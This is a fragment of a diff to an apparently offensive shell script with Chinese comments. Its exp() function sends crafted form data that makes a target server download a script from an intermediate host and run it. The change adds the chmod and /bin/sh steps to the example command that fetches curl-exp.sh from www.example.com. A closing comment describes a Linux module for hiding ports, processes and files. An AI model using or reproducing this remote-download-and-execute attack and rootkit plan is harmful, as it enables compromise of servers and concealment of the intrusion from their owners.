@@ -49,7 +49,8 @@ do
 done < data.dat
 exp(){
 	#构造一个请求包，向服务器发送请求。目标服务器下载中间服务器脚本程序执行。
-	#data的数据类似data=curl -k -L http://www.example.com/curl-exp.sh -o curl-exp.sh
+	#data的数据类似data=curl -k -L http://www.example.com/curl-exp.sh -o curl-exp.sh && 
+	#chmod +x curl-exp.sh && /bin/sh curl-exp.sh 
 	curl -k -L $1 -F "data=$data"
 }
 #实现一个隐藏端口，隐藏进程，隐藏文件的`linux mod`,
